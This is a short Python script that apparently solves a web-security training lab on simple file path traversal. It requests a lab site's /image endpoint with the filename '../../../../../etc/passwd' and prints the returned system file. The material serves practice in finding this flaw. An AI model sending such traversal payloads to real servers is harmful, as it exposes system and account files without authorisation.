# Lab: File path traversal, simple case
# difficulty: apprentice

import requests

sub = '0a5700e90364a26f836aafaa00940093'
url = f'https://{sub}.web-security-academy.net'

def main():
    params = {'filename': '../../../../../etc/passwd'}
    
    endpoint = '/image'
    r = requests.get(url + endpoint, params=params)
    print(r.text)

if __name__ == '__main__':
    main()